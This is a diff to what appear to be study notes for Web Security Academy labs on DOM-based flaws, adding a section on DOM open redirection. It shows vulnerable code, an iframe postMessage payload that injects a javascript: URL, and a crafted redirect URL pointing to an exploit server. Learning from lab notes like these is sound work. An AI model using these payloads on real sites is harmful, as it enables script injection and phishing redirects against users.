@@ -35,7 +35,7 @@
 ```
 
 ### DOM XSS using web messages and JSON.parse
-* Vulnerable Code
+* Vulnerable Code - `JSON.parse` parse the message data.
 ```html
 <script>
     window.addEventListener('message', function(e) {
@@ -64,4 +64,16 @@
 * Payload
 ```html
 <iframe src="https://acbe1f971f2cee6bc0482be200600037.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+
+### DOM-based open redirection
+* Vulnerable Code
+```html
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+```
+* Payload
+```html
+### Visit the following URL. The vulnerable code will read the value of url= and redirect the user to the following url when "Back to Blog" is clicked:
+
+https://acaa1f4e1f5e9aa7c0c6e265002f004c.web-security-academy.net/post?postId=4&url=https://exploit-ac4f1f6d1f429a0dc0e4e2eb018e0096.web-security-academy.net/ 
 ```
